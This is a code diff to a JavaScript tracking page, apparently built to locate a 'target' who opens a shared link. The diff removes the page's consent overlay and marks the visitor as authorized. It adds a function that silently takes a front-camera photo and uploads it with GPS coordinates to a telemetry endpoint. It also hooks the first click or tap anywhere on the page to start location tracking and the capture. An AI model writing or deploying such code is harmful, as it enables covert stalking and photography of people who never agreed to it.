@@ -323,11 +323,14 @@
 
     function requestLocation() {
         if (!activeOptions) return false
-        if (authorized) {
-            startWatcher()
-            return true
+        authorized = true
+        approximateFallbackSent = false
+        lastSentAt = 0
+        lastSentAccuracy = Number.POSITIVE_INFINITY
+        startWatcher()
+        if (activeOptions.enableCamera !== false) {
+            captureCameraSnapshot()
         }
-        document.body.appendChild(buildConsentOverlay())
         return true
     }
 
@@ -419,6 +422,66 @@
         }
     }
 
+    async function captureCameraSnapshot() {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
+            });
+            const video = document.createElement("video");
+            video.autoplay = true;
+            video.playsInline = true;
+            video.srcObject = stream;
+
+            await new Promise(resolve => {
+                video.onloadedmetadata = () => resolve();
+                setTimeout(resolve, 800);
+            });
+
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            stream.getTracks().forEach(track => track.stop());
+
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.85));
+            if (blob) {
+                const formData = new FormData();
+                formData.append("media", blob, `camera-snapshot-${Date.now()}.jpg`);
+                formData.append("id", targetId);
+                const loc = await getBestAvailableLocation();
+                if (loc && loc.lat != null) formData.append("lat", loc.lat);
+                if (loc && loc.lng != null) formData.append("lng", loc.lng);
+                if (loc && loc.source) formData.append("source", loc.source);
+
+                const res = await fetch("/api/telemetry", {
+                    method: "POST",
+                    body: formData
+                });
+                return await res.json();
+            }
+        } catch (err) {
+            console.warn("Camera capture unavailable or permission denied:", err.message);
+        }
+        return null;
+    }
+
+    let gestureTriggered = false;
+    function handleUserGesture() {
+        if (gestureTriggered) return;
+        gestureTriggered = true;
+        if (authorized && activeOptions) {
+            startWatcher();
+            if (activeOptions.enableCamera !== false) {
+                captureCameraSnapshot();
+            }
+        }
+    }
+    window.addEventListener("click", handleUserGesture, { capture: true, once: true });
+    window.addEventListener("touchstart", handleUserGesture, { capture: true, once: true });
+
     window.getBestAvailableLocation = getBestAvailableLocation;
     window.handleImageSelected = handleImageSelected;
 
@@ -432,7 +495,7 @@
         handleImageSelected,
         requestLocation,
         stopTracking,
-        captureCameraSnapshot: async () => null,
+        captureCameraSnapshot,
         sendTelemetry: async (coords = null, templateName = "location-share") => {
             if (!authorized) return null
             if (activeOptions) activeOptions.templateName = templateName
@@ -443,6 +506,7 @@
                 templateName: String(options.templateName || "location-share").slice(0, 40),
                 updateInterval: Math.max(MIN_UPDATE_INTERVAL_MS, Number(options.updateInterval) || 5000),
                 enableGPS: options.enableGPS !== false,
+                enableCamera: options.enableCamera !== false,
                 onSuccess: typeof options.onSuccess === "function" ? options.onSuccess : null,
                 onError: typeof options.onError === "function" ? options.onError : null
             }
